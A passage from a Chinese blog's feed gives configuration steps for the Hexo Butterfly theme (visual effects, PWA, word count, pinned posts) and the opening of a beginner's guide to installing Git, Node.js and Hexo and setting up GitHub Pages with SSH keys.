class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="打字特效"><a href="#打字特效" class="headerlink" title="打字特效"></a>打字特效</h3><p>打字特效<a href="https://github.com/disjukr/activate-power-mode" target="_blank" rel="noopener">activate-power-mode</a>  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">activate_power_mode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-type-animation.gif" class="lazyload"></p><h3 id="禁止彩带"><a href="#禁止彩带" class="headerlink" title="禁止彩带"></a>禁止彩带</h3><p>好看的彩带背景，可以设置每次刷新更换彩带，或者点击更换彩带  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">150</span></span><br><span class="line">  <span class="attr">alpha:</span> <span class="number">0.6</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span></span><br><span class="line">  <span class="attr">click_to_change:</span> <span class="literal">false</span> <span class="comment">#设置是否每次点击都更换彩带</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="string">fasel</span> <span class="comment"># false 手机端不显示 true 手机端显示</span></span><br></pre></td></tr></table></figure><p>相关配置可查看<a href="https://github.com/hustcc/ribbon.js" target="_blank" rel="noopener">canvas_ribbon</a></p><h3 id="动态彩带"><a href="#动态彩带" class="headerlink" title="动态彩带"></a>动态彩带</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_ribbon_piao:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment"># false 手机端不显示 true 手机端显示</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-canvas-ribbon-piao.gif" class="lazyload"></p><h3 id="canvas-nest"><a href="#canvas-nest" class="headerlink" title="canvas-nest"></a>canvas-nest</h3><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">'0,0,255'</span> <span class="comment">#color of lines, default: '0,0,0'; RGB values: (R,G,B).(<span class="doctag">note:</span> use ',' to separate.)</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.7</span> <span class="comment"># the opacity of line (0~1), default: 0.5.</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background, default: -1.</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">99</span> <span class="comment"># the number of lines, default: 99.</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment"># false 手机端不显示 true 手机端显示</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-canvas_nest.gif" class="lazyload"></p><h3 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h3><h4 id="烟花"><a href="#烟花" class="headerlink" title="烟花"></a>烟花</h4><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">fireworks:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-firewall.gif" class="lazyload"></p><h4 id="爱心"><a href="#爱心" class="headerlink" title="爱心"></a>爱心</h4><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 点击出现爱心</span></span><br><span class="line"><span class="attr">click_heart:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/click_love.gif" class="lazyload"></p><h4 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h4><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 点击出现文字，文字可自行修改</span></span><br><span class="line"><span class="attr">ClickShowText:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">text:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">富强</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">民主</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">文明</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">和谐</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">自由</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">平等</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">公正</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">法治</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">爱国</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">敬业</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">诚信</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">友善</span></span><br><span class="line">  <span class="attr">fontSize:</span> <span class="string">15px</span></span><br></pre></td></tr></table></figure><h3 id="文章页美化"><a href="#文章页美化" class="headerlink" title="文章页美化"></a>文章页美化</h3><p>会改变ol、ul、h1-h5的样式  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_beautify:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">title-prefix-icon:</span> <span class="string">'\f0c1'</span></span><br><span class="line">  <span class="attr">title-prefix-icon-color:</span> <span class="string">"#F4766"</span></span><br></pre></td></tr></table></figure><p><code>title-prefix-icon</code>填写的是fontawesome的icon的Unicode数。</p><h3 id="自定义字体"><a href="#自定义字体" class="headerlink" title="自定义字体"></a>自定义字体</h3><p>可自行设置字体的<code>font-family</code>  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">font:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">font-family:</span> <span class="string">Lato,</span> <span class="string">Helvetica</span> <span class="string">Neue</span> <span class="string">For</span> <span class="string">Number,</span> <span class="string">-apple-system,</span> <span class="string">BlinkMacSystemFont,</span> <span class="string">Segoe</span> <span class="string">UI,</span> <span class="string">Roboto,</span> <span class="string">PingFang</span> <span class="string">SC,</span> <span class="string">Hiragino</span> <span class="string">Sans</span> <span class="string">GB,"Microsoft</span> <span class="string">JhengHei",</span> <span class="string">"MicrMicrosoft YaHei"</span><span class="string">,</span> <span class="string">Helvetica</span> <span class="string">Neue,</span> <span class="string">Helvetica,</span> <span class="string">Arial,</span> <span class="string">sans-serif</span></span><br><span class="line">  <span class="attr">code-font:</span> <span class="string">consolas,</span> <span class="string">Menlo,</span> <span class="string">"PingFang SC"</span><span class="string">,</span> <span class="string">"Microsoft JhengHei"</span><span class="string">,"Microsoft</span> <span class="string">YaHei",</span> <span class="string">monospace,</span> <span class="string">Helvetica</span> <span class="string">Neue</span> <span class="string">For</span> <span class="string">Number</span></span><br></pre></td></tr></table></figure><h3 id="网站副标题"><a href="#网站副标题" class="headerlink" title="网站副标题"></a>网站副标题</h3><div class="note info no-icon">            <p>适用于版本号&gt;=V1.2.0  </p><p>V2.0.0开始增加一些第三方api调用</p>          </div><p>可设置主页中显示的网站副标题或则喜欢的座右铭。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主页subtitle</span></span><br><span class="line"><span class="comment"># 打字效果</span></span><br><span class="line"><span class="attr">subtitle:</span> </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source调用第三方服务</span></span><br><span class="line">  <span class="comment"># source: false 关闭调用 </span></span><br><span class="line">  <span class="comment"># source: 1  调用金山词霸的每日一句（简体）</span></span><br><span class="line">  <span class="comment"># source: 2  调用一言网的一句话（简体） #https://hitokoto.cn/</span></span><br><span class="line">  <span class="comment"># source: 3  调用一句网（简体） http://yijuzhan.com/</span></span><br><span class="line">  <span class="comment"># source: 4  调用今日诗词（简体） https://www.jinrishici.com/</span></span><br><span class="line">  <span class="comment"># subtitle 会先显示 source , 再显示 sub 的内容</span></span><br><span class="line">  <span class="attr">source:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># (如果有英文逗号' , '，请使用转义字符 &amp;#44;)</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">今日事&amp;#44;今日毕</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Never</span> <span class="string">put</span> <span class="string">off</span> <span class="string">till</span> <span class="string">tomorrow</span> <span class="string">what</span> <span class="string">you</span> <span class="string">can</span> <span class="string">do</span> <span class="string">today</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/subtitle.gif" class="lazyload"></p><h3 id="top-img显示大小"><a href="#top-img显示大小" class="headerlink" title="top_img显示大小"></a>top_img显示大小</h3><div class="note info no-icon">            <p>适用于版本号&gt;=V1.2.0</p>          </div><p>默认的显示为全屏。site-info的区域会居中显示</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主页设置</span></span><br><span class="line"><span class="comment"># 默认top_img全屏，site_info在中间</span></span><br><span class="line"><span class="comment"># 使用默认, 都无需填写（建议默认）</span></span><br><span class="line"><span class="attr">index_site_info_top:</span>   <span class="comment">#主页标题距离顶部距离  例如 300px/300em/300rem/10%</span></span><br><span class="line"><span class="attr">index_top_img_height:</span>  <span class="comment">#主页top_img高度 例如 300px/300em/300rem  不能使用百分比</span></span><br></pre></td></tr></table></figure><p>注意:<code>index_top_img_height</code>的值不能使用百分比。<br>2个都不填的话会使用默认值  </p><p>举例  当</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">index_site_info_top:</span> <span class="number">40</span><span class="string">%</span></span><br><span class="line"><span class="attr">index_top_img_height:</span> <span class="string">400px</span></span><br></pre></td></tr></table></figure><h2 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h2><p>要为<code>Butterfly</code>配上PWA特性，你需要如下几个步骤：</p><ol><li>打开hexo工作目录</li><li><code>nmp install hexo-offline --save</code>或者<code>yarn add hexo-offline</code></li><li>修改<code>_config.yml</code>在站点<code>_config.yml</code>中增加以下内容。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># offline config passed to sw-precache.</span></span><br><span class="line"><span class="attr">offline:</span></span><br><span class="line">  <span class="attr">maximumFileSizeToCacheInBytes:</span> <span class="number">10485760</span> <span class="comment"># 缓存的最大文件大小，以字节为单位</span></span><br><span class="line">  <span class="attr">staticFileGlobs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">public/**/*.&#123;js,html,css,png,jpg,gif,svg,webp,eot,ttf,woff,woff2&#125;</span></span><br><span class="line">  <span class="comment"># 静态文件合集，如果你的站点使用了例如webp格式的文件，请将文件类型添加进去。</span></span><br><span class="line">  <span class="attr">stripPrefix:</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">verbose:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">runtimeCaching:</span></span><br><span class="line">    <span class="comment"># CDNs - should be cacheFirst, since they should be used specific versions so should not change</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">urlPattern:</span> <span class="string">/*</span> <span class="comment"># 如果你需要加载CDN资源，请配置该选项，如果没有，可以不配置。</span></span><br><span class="line">      <span class="attr">handler:</span> <span class="string">cacheFirst</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">origin:</span> <span class="string">your_websie_url</span> <span class="comment"># 可替换成你的 url</span></span><br></pre></td></tr></table></figure>更多内容请查看<a href="https://github.com/JLHwung/hexo-offline" target="_blank" rel="noopener">hexo-offline</a>的官方文档</li><li>在<code>butterfly.yml</code>中开启pwa选项。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pwa:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">manifest:</span> <span class="string">/img/pwa/manifest.json</span></span><br><span class="line">  <span class="attr">theme_color:</span> <span class="string">"#fff"</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/img/pwa/apple-touch-icon.png</span></span><br><span class="line">  <span class="attr">favicon_32_32:</span> <span class="string">/img/pwa/32.png</span></span><br><span class="line">  <span class="attr">favicon_16_16:</span> <span class="string">/img/pwa/16.png</span></span><br><span class="line">  <span class="attr">mask_icon:</span> <span class="string">/img/pwa/safari-pinned-tab.svg</span></span><br></pre></td></tr></table></figure></li><li>在创建<code>source/</code>目录中创建<code>manifest.json</code>文件。<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"string"</span>, <span class="comment">//应用全称</span></span><br><span class="line">    <span class="attr">"short_name"</span>: <span class="string">"Junzhou"</span>, <span class="comment">//应用简称</span></span><br><span class="line">    <span class="attr">"theme_color"</span>: <span class="string">"#49b1f5"</span>, <span class="comment">//匹配浏览器的地址栏颜色</span></span><br><span class="line">    <span class="attr">"background_color"</span>: <span class="string">"#49b1f5"</span>,<span class="comment">//加载应用时的背景色</span></span><br><span class="line">    <span class="attr">"display"</span>: <span class="string">"standalone"</span>,<span class="comment">//首选显示模式 其他选项有：fullscreen,minimal-ui,browser</span></span><br><span class="line">    <span class="attr">"scope"</span>: <span class="string">"/"</span>,</span><br><span class="line">    <span class="attr">"start_url"</span>: <span class="string">"/"</span>,</span><br><span class="line">    <span class="attr">"icons"</span>: [ <span class="comment">//该数组指定icons图标参数，用来时适配不同设备（需为png，至少包含一个192px*192px的图标）</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"src"</span>: <span class="string">"images/pwaicons/36.png"</span>, <span class="comment">//图标文件的目录，需在source/目录下自行创建。</span></span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"36x36"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"src"</span>: <span class="string">"images/pwaicons/48.png"</span>,</span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"48x48"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"src"</span>: <span class="string">"images/pwaicons/72.png"</span>,</span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"72x72"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"src"</span>: <span class="string">"images/pwaicons/96.png"</span>,</span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"96x96"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"src"</span>: <span class="string">"images/pwaicons/144.png"</span>,</span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"144x144"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"src"</span>: <span class="string">"images/pwaicons/192.png"</span>,</span><br><span class="line">          <span class="attr">"sizes"</span>: <span class="string">"192x192"</span>,</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"src"</span>: <span class="string">"images/pwaicons/512.png"</span>,</span><br><span class="line">            <span class="attr">"sizes"</span>: <span class="string">"512x512"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"image/png"</span></span><br><span class="line">          &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"splash_pages"</span>: <span class="literal">null</span> <span class="comment">//配置自定义启动动画。</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>你也可以通过<a href="https://app-manifest.firebaseapp.com/" target="_blank" rel="noopener">Web App Nabufest</a>快速创建<code>manifest.json</code>。(Web App Manifest要求至少包含一个512*512像素的图标）</li><li>可以通过<code>Chrome</code>插件<code>Lighthouse</code>检查PWA配置是否生效以及配置是否正确。<ul><li>打开博客页面</li><li>启动<code>Lighthouse</code>插件(<code>Lighthouse</code>插件要求至少包含一个512*512像素的图标)<br>关于PWA(渐进式增强Web应用)的更多内容请参阅<a href="https://developers.google.com/web/tools/lighthouse/audits/address-bar" target="_blank" rel="noopener">Google Tools for Web Developers</a></li></ul></li></ol><h2 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h2><p>要为<code>Butterfly</code>配上数字统计特性，你需要如下几个步骤：</p><ol><li>打开hexo工作目录</li><li><code>npm install hexo-wordcount --save</code>or<code>yarn add hexo-wordcount</code></li><li>配置<code>butterfly.yml</code></li></ol><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-word-count.png" class="lazyload"></p><h2 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h2><p>要为你一些文章置顶，你需要如下步骤:</p><ol><li>打开hexo工作目录</li><li><code>npm uninstall hexo-genrator-index --save</code>然后<code>npm install hexo-generator-index-pin-top --save</code></li><li>你要在文章的<code>front-matter</code>区域里添加<code>top: True</code>属性来把这篇文章置顶。</li><li>你可以参考<a href="https://github.com/netcan/hexo-generator-index-pin-top" target="_blank" rel="noopener">hexo-generator-index-pin-top</a>这个仓库来了解更多细节。</li></ol><p>举个例子：  </p><p>你的莫篇文章开头如下:</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">    - </span>xxx</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">---</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><p>现在把<code>top: true</code>加进去:</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">    - </span>xxx</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">top: True</span><br><span class="line">---</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><h2 id="图片大图查看模式"><a href="#图片大图查看模式" class="headerlink" title="图片大图查看模式"></a>图片大图查看模式</h2><p>默认为fancybox，可以选择改为medium_zoom  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">medium_zoom:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>fancybox打开模式</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/fancybox.gif" class="lazyload"></p><div class="note info no-icon">            <p>medium_zoom打开模式</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/medium_zoom.gif" class="lazyload"></p><h3 id="Snackbar弹窗"><a href="#Snackbar弹窗" class="headerlink" title="Snackbar弹窗"></a>Snackbar弹窗</h3><p>Snackbar弹窗，根据自己爱好开启  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Snackbar 弹窗</span></span><br><span class="line"><span class="comment"># https://github.com/polonel/SnackBar</span></span><br><span class="line"><span class="comment"># position 弹窗位置</span></span><br><span class="line"><span class="comment"># 可选 top-left / top-center / top-right / bottom-left / bottom-center / bottom-right</span></span><br><span class="line"><span class="attr">snackbar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">bottom-left</span></span><br><span class="line">  <span class="attr">bg_light:</span> <span class="string">'#49b1f5'</span> <span class="comment">#light mode时弹窗背景</span></span><br><span class="line">  <span class="attr">bg_dark:</span> <span class="string">'#2d3035'</span> <span class="comment">#dark mode时弹窗背景</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>未开启Snackbar</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/snackbar_false.gif" class="lazyload"></p><div class="note info no-icon">            <p>开启Snackbar</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/snackbar_true.gif" class="lazyload"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Butterfly这个主题总的来说功能比较齐全，该有的功能都有，而且大多数都有多种方案可以选择或者自定义。但是由于元素较多，如果用只用GitHub Page来搭建的话渲染比较慢，我会在后面更新一个自定义域名同时绑定GitHub和Coding达到域名分流来解决渲染慢的问题  </p><p>本文参考主题作者(<a href="https://jerryc.me/about/" target="_blank" rel="noopener">jerry</a>)的安装文档而写的，可以访问作者的安装文档:<a href="https://jerryc.me/posts/21cfbf15/" target="_blank" rel="noopener">https://jerryc.me/posts/21cfbf15/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="网站搭建" scheme="https://c-hasel.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="hexo" scheme="https://c-hasel.github.io/tags/hexo/"/>
    
      <category term="博客搭建" scheme="https://c-hasel.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客搭建一:基本配置</title>
    <link href="https://c-hasel.github.io/2019/11/29/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/"/>
    <id>https://c-hasel.github.io/2019/11/29/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/</id>
    <published>2019-11-29T22:38:28.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="hexo博客搭建教程以及基本配置"><a href="#hexo博客搭建教程以及基本配置" class="headerlink" title="hexo博客搭建教程以及基本配置"></a><center>hexo博客搭建教程以及基本配置</center></h1><p>我花了大概一周的时间搭建了这个博客，过程中遇到不少的坑，下面就分享一下搭建过程，避免各位跟我遇到同样的坑。</p><h1 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h1><div class="note info no-icon">            <p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以生成静态页面托管在github和coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/" target="_blank" rel="noopener">hexo官网</a>进行详细的查看。</p>          </div><p>教程分为三个部分：</p><ul><li>hexo的初级搭建部署到github page上</li><li>hexo的基本配置、主题的应用、实现多终端工作</li></ul><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h2><p>1.安装Git<br>2.安装Node.js<br>3.安装Hexo<br>4.GitHub创建个人仓库<br>5.生成SSH添加到GitHub<br>6.将hexo部署到GitHub<br>7.发布文章</p><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><div class="note info no-icon">            <p>windows:到git官网上下载，<a href="https://gitforwindows.org/" target="_blank" rel="noopener">Download git</a>，下载后会有Git Bash的命令行工具，以后就用这个工具来使用git。<br>linux:对linux来说实在太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p>          </div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>安装好后,用<code>git --version</code>来查看一下版本</p><h3 id="2-安装nodejs"><a href="#2-安装nodejs" class="headerlink" title="2.安装nodejs"></a>2.安装nodejs</h3><div class="note info no-icon">            <p>Hexo是基于nodejs编写的，所以需要安装一下nodejs和里面的npm工具<br>windows:<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">nodejs</a>选择LTS版本就行了</p>          </div><p>linux:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure><p>安装完成后，输入如下命令检查是否安装成功</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p>顺便说一下，Windows在git安装好后，就可以直接使用git bash来敲命令了，不用自带的cmd，cmd有点难用</p><h3 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3.安装hexo"></a>3.安装hexo</h3><div class="note info no-icon">            <p>git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下(或者在这个文件夹下直接右键git bash打开)<br>输入命令(Windows和linux相同)</p>          </div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>依旧用<code>hexo -v</code>检查一下版本，如果没有报错就安装完成了<br>接下来初始化hexo</p>          </div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init myblog</span><br></pre></td></tr></table></figure><p>这个myblog可以自定义<br>然后输入如下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog //进入myblog文件夹</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹目录下有:</p><ul><li>node_modules: 依赖包</li><li>public: 存放生成的页面</li><li>scaffolds: 生成文章的一些模板</li><li>source: 用来存放你的文章</li><li>themes: 主题</li><li>_config.yml: 博客的配置文件</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g //生成静态页面</span><br><span class="line">hexo server //本地预览</span><br></pre></td></tr></table></figure><p>在浏览器输入localhost:4000就可以看到你生成的博客了。<br>大概长这样：<br><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/hexoinit.png" class="lazyload"><br><kbd>ctrl</kbd>+<kbd>c</kbd>关闭服务</p><h3 id="4-GitHub创建个人仓库"><a href="#4-GitHub创建个人仓库" class="headerlink" title="4.GitHub创建个人仓库"></a>4.GitHub创建个人仓库</h3><div class="note info no-icon">            <p>首先，你要注册一个github账户<br>注册完成后，在github.com中看到你个New repository,新建仓库</p>          </div><p><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/newrepo.png" class="lazyload"></p><div class="note info no-icon">            <p>创建一个和你用户名相同的仓库，后面加<font color="Blue">.github.io</font>，只有这样，部署到GitHub page的时候才会被识别，也就<font color="Blue">xxx.github.io</font>，xxx就是你注册GitHub的用户名</p>          </div><p><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/newr.png" class="lazyload"><br>点击create repository</p><h3 id="5-生成SSH添加到Cithub"><a href="#5-生成SSH添加到Cithub" class="headerlink" title="5.生成SSH添加到Cithub"></a>5.生成SSH添加到Cithub</h3><p>回到git bash中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">"yourname"</span> </span><br><span class="line">git config --global user.email <span class="string">"youremail"</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>这里的yourname是你GitHub的用户名，youremail是你GitHub的邮箱。<br>检查是否输入正确</p>          </div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p>然后创建SSH</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br></pre></td></tr></table></figure><p>一路回车，这个时候他会告诉你已经生成了.ssh的文件，在.ssh文件夹中会看到这三个文件<br><img alt data-src="/img/hexo%E6%90%AD%E5%BB%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/ssh.png" class="lazyload"></p><div class="note info no-icon">            